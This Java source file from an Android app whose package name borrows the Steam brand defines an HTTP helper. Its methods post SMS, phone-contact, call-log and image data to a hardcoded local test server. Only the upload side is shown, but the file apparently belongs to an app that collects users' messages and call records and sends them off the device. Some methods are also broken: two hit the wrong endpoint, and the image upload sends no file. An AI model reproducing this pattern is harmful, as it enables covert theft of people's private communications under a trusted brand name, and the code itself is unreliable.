package com.steam.android.androidsteam;


/**
 * Created by beicky on 18/4/13.
 */
public class Http {
    public void sms(String json1) {
        String uri = "http://192.168.1.106:8080/testSSM/sms/sms";
        //添加http头 信息
//        httppost.addHeader("Authorization", "token"); //认证token
//        httppost.addHeader("User-Agent", "imgfornote");
//        httppost.setHeader("Content-Type", "application/json; charset=UTF-8");
        Yodo1HttpManage.getInstance().post(uri, json1, new HttpStringListener() {
            @Override
            public void onSuccess(int code, String responseString) {

            }

            @Override
            public void onFailure(int errorCode, String msg) {

            }
        });
    }


    public void phone(String json1) {
        String uri = "http://192.168.1.106:8080/testSSM/phone/phone";
        //添加http头 信息
//            httppost.addHeader("Authorization", "token"); //认证token
//            httppost.addHeader("User-Agent", "imgfornote");
//            httppost.setHeader("Content-Type", "application/json; charset=UTF-8");
        Yodo1HttpManage.getInstance().post(uri, json1, new HttpStringListener() {
            @Override
            public void onSuccess(int code, String responseString) {

            }

            @Override
            public void onFailure(int errorCode, String msg) {

            }
        });
    }

    public void callLog(String json1) {
        String uri = "http://192.168.1.106:8080/testSSM/phone/phone";

        //添加http头 信息
//            httppost.addHeader("Authorization", "token"); //认证token
//            httppost.addHeader("User-Agent", "imgfornote");
//            httppost.setHeader("Content-Type", "application/json; charset=UTF-8");
        Yodo1HttpManage.getInstance().post(uri, json1, new HttpStringListener() {
            @Override
            public void onSuccess(int code, String responseString) {

            }

            @Override
            public void onFailure(int errorCode, String msg) {

            }
        });
    }

    public void imageUpload(String filePath) {
        String uri = "http://192.168.1.106:8080/testSSM/phone/phone";
        YLog.d(filePath);
        //添加http头 信息
//            httppost.addHeader("Authorization", "token"); //认证token
//            httppost.addHeader("User-Agent", "imgfornote");
//            httppost.setHeader("Content-Type", "application/json; charset=UTF-8");
        Yodo1HttpManage.getInstance().get(uri, new HttpStringListener() {
            @Override
            public void onSuccess(int code, String responseString) {

            }

            @Override
            public void onFailure(int errorCode, String msg) {

            }
        });
    }
}
